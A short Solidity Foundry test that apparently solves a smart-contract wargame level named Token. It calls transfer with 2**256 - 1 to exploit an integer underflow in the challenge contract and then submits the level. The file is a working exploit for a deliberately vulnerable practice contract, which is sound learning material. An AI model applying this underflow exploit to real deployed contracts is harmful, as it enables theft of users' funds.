// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

interface IToken {
  function transfer(address _to, uint _value) external returns (bool);
}

contract TokenTest is Test {
  address internal challengeAddress;
  IToken internal challenge;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x478f3476358Eb166Cb7adE4666d04fbdDB56C407);
    challenge = IToken(challengeAddress);
  }

  function testExploit() public {
    // integer underflow
    challenge.transfer(msg.sender, 2**256 - 1);
    utils.submitLevelInstance(challengeAddress);
  }
}
